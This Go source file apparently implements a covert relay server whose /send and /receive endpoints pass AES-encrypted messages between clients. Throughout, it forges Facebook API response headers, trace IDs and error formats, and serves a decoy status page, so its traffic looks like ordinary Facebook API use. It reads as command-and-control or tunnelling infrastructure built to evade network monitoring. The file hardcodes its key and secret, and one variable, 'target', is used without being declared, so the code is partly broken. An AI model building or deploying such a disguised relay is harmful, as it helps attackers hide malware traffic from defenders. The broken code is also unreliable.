package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"sync"
	"time"
)

// Buffer manages per-client data with expiration
type Buffer struct {
	data map[string][]message
	mu   sync.RWMutex
}

type message struct {
	data      []byte
	timestamp time.Time
}

func NewBuffer() *Buffer {
	return &Buffer{
		data: make(map[string][]message),
	}
}

func (b *Buffer) Add(token string, data []byte) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.data[token] = append(b.data[token], message{data: data, timestamp: time.Now()})
	// Keep buffer small (max 100 messages per token)
	if len(b.data[token]) > 100 {
		b.data[token] = b.data[token][1:]
	}
}

func (b *Buffer) Pop(token string) ([]byte, bool) {
	b.mu.Lock()
	defer b.mu.Unlock()

	// Cleanup expired messages
	now := time.Now()
	valid := []message{}
	for _, msg := range b.data[token] {
		if now.Sub(msg.timestamp) < 30*time.Second {
			valid = append(valid, msg)
		}
	}
	b.data[token] = valid

	if len(b.data[token]) == 0 {
		return nil, false
	}
	data := b.data[token][0].data
	b.data[token] = b.data[token][1:]
	return data, true
}

// Cleanup expired sessions periodically
func (b *Buffer) StartCleanupTask() {
	go func() {
		for {
			time.Sleep(60 * time.Second)
			b.cleanup()
		}
	}()
}

func (b *Buffer) cleanup() {
	b.mu.Lock()
	defer b.mu.Unlock()

	now := time.Now()
	for token, messages := range b.data {
		valid := []message{}
		for _, msg := range messages {
			if now.Sub(msg.timestamp) < 5*time.Minute {
				valid = append(valid, msg)
			}
		}
		if len(valid) == 0 {
			delete(b.data, token)
		} else {
			b.data[token] = valid
		}
	}
}

// AES Encryption
var (
	buffer     = NewBuffer()
	encryptKey = []byte("1234567890abcdef") // 16 bytes for AES-128
	authSecret = "super_secret_auth"        // Simple shared auth secret
)

// Facebook-like random string generators
func generateFacebookDebugID() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, 16)
	for i := range result {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		result[i] = chars[n.Int64()]
	}
	return string(result)
}

func generateFacebookTraceID() string {
	// Facebook trace IDs are large numbers
	n, _ := rand.Int(rand.Reader, big.NewInt(9000000000000000))
	return fmt.Sprintf("%d", n.Int64()+1000000000000000)
}

func generateRandomCluster() string {
	clusters := []string{"c1", "c2", "c3", "ash", "prn", "dfw"}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(clusters))))
	return clusters[n.Int64()]
}

// AES Encrypt
func encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptKey)
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]

	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	stream := cipher.NewCTR(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)

	return ciphertext, nil
}

// AES Decrypt
func decrypt(ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptKey)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	iv := ciphertext[:aes.BlockSize]
	data := ciphertext[aes.BlockSize:]

	stream := cipher.NewCTR(block, iv)
	stream.XORKeyStream(data, data)

	return data, nil
}

// Add Facebook response headers
func addFacebookHeaders(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "application/json; charset=UTF-8")
	w.Header().Set("X-FB-Debug", generateFacebookDebugID())
	w.Header().Set("X-FB-Trace-ID", generateFacebookTraceID())
	w.Header().Set("Facebook-API-Version", "v15.0")
	w.Header().Set("Pragma", "no-cache")
	w.Header().Set("Cache-Control", "private, no-cache, no-store, must-revalidate")
	w.Header().Set("Expires", "Sat, 01 Jan 2000 00:00:00 GMT")
	w.Header().Set("Vary", "Accept-Encoding")
	w.Header().Set("Strict-Transport-Security", "max-age=15552000; preload")
}

// Handlers
func sendHandler(w http.ResponseWriter, r *http.Request) {
	// Check for fake Facebook user agent
	userAgent := r.Header.Get("User-Agent")
	hasFacebookUA := false
	if userAgent != "" {
		hasFacebookUA = (len(userAgent) > 20 && 
			(r.Header.Get("X-FB-HTTP-Engine") != "" || 
			 r.Header.Get("X-FB-Connection-Type") != ""))
	}

	if r.Method != http.MethodPost {
		// Still accept the request but log it
		log.Printf("Warning: Non-POST request to /send: %s", r.Method)
	}

	// Get token from headers - accept both custom header and Facebook-like header
	token := r.Header.Get("X-Token")
	if token == "" {
		token = r.Header.Get("X-FB-Trace-ID")
	}
	
	if token == "" {
		// Generate a new token for them
		token = generateFacebookTraceID()
	}

	// For auth, we'll accept either our custom header or proper Facebook-like headers
	authenticated := (r.Header.Get("X-Auth") == authSecret) || hasFacebookUA

	if !authenticated {
		addFacebookHeaders(w)
		http.Error(w, `{"error": "Facebook API authentication required"}`, http.StatusUnauthorized)
		return
	}

	// Get data from either custom header or body
	var data []byte
	var err error
	
	target = r.Header.Get("X-Target")
	if target != "" {
		// Using header method
		encryptedData, err := base64.StdEncoding.DecodeString(target)
		if err != nil {
			addFacebookHeaders(w)
			http.Error(w, `{"error": "Invalid payload format"}`, http.StatusBadRequest)
			return
		}
		
		data, err = decrypt(encryptedData)
		if err != nil {
			addFacebookHeaders(w)
			http.Error(w, `{"error": "Payload processing failed"}`, http.StatusBadRequest)
			return
		}
	} else {
		// Using body method
		maxSize := 1024 * 1024 // 1MB limit
		r.Body = http.MaxBytesReader(w, r.Body, int64(maxSize))
		
		encryptedData, err := io.ReadAll(r.Body)
		if err != nil {
			addFacebookHeaders(w)
			http.Error(w, `{"error": "Failed to read request body"}`, http.StatusBadRequest)
			return
		}
		
		if len(encryptedData) == 0 {
			addFacebookHeaders(w)
			http.Error(w, `{"error": "Empty request body"}`, http.StatusBadRequest)
			return
		}
		
		// Try to decrypt if it looks like our data
		if len(encryptedData) > aes.BlockSize {
			data, err = decrypt(encryptedData)
			if err != nil {
				// If decryption fails, assume it's base64
				decoded, err := base64.StdEncoding.DecodeString(string(encryptedData))
				if err == nil && len(decoded) > aes.BlockSize {
					data, err = decrypt(decoded)
				}
				
				// If still failing, just use the raw data
				if err != nil {
					data = encryptedData
				}
			}
		} else {
			data = encryptedData
		}
	}

	// Add data to buffer for this token
	buffer.Add(token, data)

	// Return Facebook-like response
	addFacebookHeaders(w)
	resp := map[string]interface{}{
		"status": "success",
		"trace_id": token,
		"server_time": time.Now().UnixMilli(),
	}
	json.NewEncoder(w).Encode(resp)
}

func receiveHandler(w http.ResponseWriter, r *http.Request) {
	// Check for Facebook user agent
	userAgent := r.Header.Get("User-Agent")
	hasFacebookUA := false
	if userAgent != "" {
		hasFacebookUA = (len(userAgent) > 20 && 
			(r.Header.Get("X-FB-HTTP-Engine") != "" || 
			 r.Header.Get("X-FB-Connection-Type") != ""))
	}

	if r.Method != http.MethodGet {
		// Still accept the request but log it
		log.Printf("Warning: Non-GET request to /receive: %s", r.Method)
	}

	// Get token from headers - accept both custom header and Facebook-like header
	token := r.Header.Get("X-Token")
	if token == "" {
		token = r.Header.Get("X-FB-Trace-ID")
	}
	
	if token == "" {
		addFacebookHeaders(w)
		http.Error(w, `{"error": "Missing session identifier"}`, http.StatusBadRequest)
		return
	}

	// For auth, we'll accept either our custom header or proper Facebook-like headers
	authenticated := (r.Header.Get("X-Auth") == authSecret) || hasFacebookUA

	if !authenticated {
		addFacebookHeaders(w)
		http.Error(w, `{"error": "Facebook API authentication required"}`, http.StatusUnauthorized)
		return
	}

	// Try to get data up to 3 times with 1 second intervals
	for i := 0; i < 3; i++ {
		if data, ok := buffer.Pop(token); ok {
			encryptedData, err := encrypt(data)
			if err != nil {
				addFacebookHeaders(w)
				http.Error(w, `{"error": "Processing failure"}`, http.StatusInternalServerError)
				return
			}
			
			addFacebookHeaders(w)
			resp := map[string]interface{}{
				"data": base64.StdEncoding.EncodeToString(encryptedData),
				"trace_id": token,
				"server_time": time.Now().UnixMilli(),
			}
			json.NewEncoder(w).Encode(resp)
			return
		}
		time.Sleep(500 * time.Millisecond)
	}

	// If no data, return Facebook-like empty response
	addFacebookHeaders(w)
	resp := map[string]interface{}{
		"status": "no_data",
		"trace_id": token,
		"server_time": time.Now().UnixMilli(),
	}
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(resp)
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
	// If browser request, return something looking like a normal website
	if r.Header.Get("Accept") != "" && r.Header.Get("Accept") == "*/*" {
		w.Header().Set("Content-Type", "text/html; charset=UTF-8")
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
  <title>Status</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
    .status { background: #f5f6f7; padding: 20px; border-radius: 4px; }
    .dot { height: 10px; width: 10px; background-color: #4CAF50; border-radius: 50%; display: inline-block; }
  </style>
</head>
<body>
  <div class="status">
    <h1>Service Status</h1>
    <p>System: <span class="dot"></span> Online</p>
    <p>Last updated: %s</p>
  </div>
</body>
</html>`, time.Now().Format(time.RFC1123))
		return
	}

	// Otherwise return JSON
	addFacebookHeaders(w)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "online",
		"server_time": time.Now().UnixMilli(),
		"server_id": generateRandomCluster(),
	})
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		// For any path other than explicitly defined ones, return 404
		// but make it look like a Facebook error
		addFacebookHeaders(w)
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": map[string]interface{}{
				"message": "Endpoint not found",
				"type": "APIException",
				"code": 404,
				"fbtrace_id": generateFacebookTraceID(),
			},
		})
		return
	}
	
	// For the root path, use health handler
	healthHandler(w, r)
}

func main() {
	// Initialize buffer and start cleanup task
	buffer.StartCleanupTask()
	
	// Read key from environment if available
	if envKey := os.Getenv("ENCRYPTION_KEY"); envKey != "" {
		envKeyBytes := []byte(envKey)
		if len(envKeyBytes) >= 16 {
			// Use first 16 bytes for AES-128
			encryptKey = envKeyBytes[:16]
		}
	}
	
	// Read auth secret from environment if available
	if envAuth := os.Getenv("AUTH_SECRET"); envAuth != "" {
		authSecret = envAuth
	}

	// Set up routes
	mux := http.NewServeMux()
	mux.HandleFunc("/send", sendHandler)
	mux.HandleFunc("/receive", receiveHandler)
	mux.HandleFunc("/health", healthHandler)
	mux.HandleFunc("/", rootHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("Starting Facebook API proxy on :%s", port)
	server := &http.Server{
		Addr:              ":" + port,
		Handler:           mux,
		ReadTimeout:       10 * time.Second,
		WriteTimeout:      10 * time.Second,
		IdleTimeout:       60 * time.Second,
		ReadHeaderTimeout: 5 * time.Second,
	}
	
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
